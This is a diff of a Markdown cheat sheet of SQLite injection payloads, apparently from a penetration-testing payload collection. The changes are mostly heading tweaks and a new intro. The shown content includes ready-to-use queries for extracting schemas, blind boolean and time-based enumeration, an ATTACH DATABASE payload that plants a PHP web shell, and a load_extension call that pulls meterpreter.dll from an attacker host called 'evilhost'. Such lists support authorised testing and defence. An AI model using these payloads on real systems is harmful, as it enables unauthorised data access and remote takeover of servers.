@@ -1,37 +1,41 @@
 # SQLite Injection
 
+> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues. 
+
+
 ## Summary
 
-* [SQLite comments](#sqlite-comments)
-* [SQLite version](#sqlite-version)
-* [String based - Extract database structure](#string-based---extract-database-structure)
-* [Integer/String based - Extract table name](#integerstring-based---extract-table-name)
-* [Integer/String based - Extract column name](#integerstring-based---extract-column-name)
-* [Boolean - Count number of tables](#boolean---count-number-of-tables)
-* [Boolean - Enumerating table name](#boolean---enumerating-table-name)
-* [Boolean - Extract info](#boolean---extract-info)
-* [Boolean - Error based](#boolean---error-based)
-* [Time based](#time-based)
+* [SQLite Comments](#sqlite-comments)
+* [SQLite Version](#sqlite-version)
+* [String Based - Extract Database Structure](#string-based---extract-database-structure)
+* [Integer/String Based - Extract Table Name](#integerstring-based---extract-table-name)
+* [Integer/String Based - Extract Column Name](#integerstring-based---extract-column-name)
+* [Boolean - Count Number Of Tables](#boolean---count-number-of-tables)
+* [Boolean - Enumerating Table Name](#boolean---enumerating-table-name)
+* [Boolean - Extract Info](#boolean---extract-info)
+* [Boolean - Error Based](#boolean---error-based)
+* [Time Based](#time-based)
 * [Remote Code Execution](#remote-code-execution)
     * [Attach Database](#attach-database)
     * [Load_extension](#load_extension)
 * [References](#references)
 
 
-## SQLite comments
+## SQLite Comments
 
 ```sql
 --
 /**/
 ```
 
-## SQLite version
+## SQLite Version
 
 ```sql
 select sqlite_version();
 ```
 
-## String based - Extract database structure
+
+## String Based - Extract Database Structure
 
 ```sql
 SELECT sql FROM sqlite_schema
@@ -40,13 +44,16 @@ if sqlite_version > 3.33.0
 ```sql
 SELECT sql FROM sqlite_master
 ```
-## Integer/String based - Extract table name
+
+
+## Integer/String Based - Extract Table Name
 
 ```sql
 SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 ```
 
-## Integer/String based - Extract column name
+
+## Integer/String Based - Extract Column Name
 
 ```sql
 SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
@@ -64,37 +71,38 @@ Cleaner output
 SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
 ```
 
-## Boolean - Count number of tables
+
+## Boolean - Count Number Of Tables
 
 ```sql
 and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
 ```
 
-## Boolean - Enumerating table name
+## Boolean - Enumerating Table Name
 
 ```sql
 and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
 ```
 
-## Boolean - Extract info
+## Boolean - Extract Info
 
 ```sql
 and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
 ```
 
-## Boolean - Extract info (order by)
+### Boolean - Extract Info (order by)
 
 ```sql
 CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
 ```
 
-## Boolean - Error based
+## Boolean - Error Based
 
 ```sql
 AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
 ```
 
-## Time based
+## Time Based
 
 ```sql
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
@@ -117,7 +125,7 @@ INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 ```
 
-Note: By default this component is disabled
+Note: By default this component is disabled.
 
 
 ## References
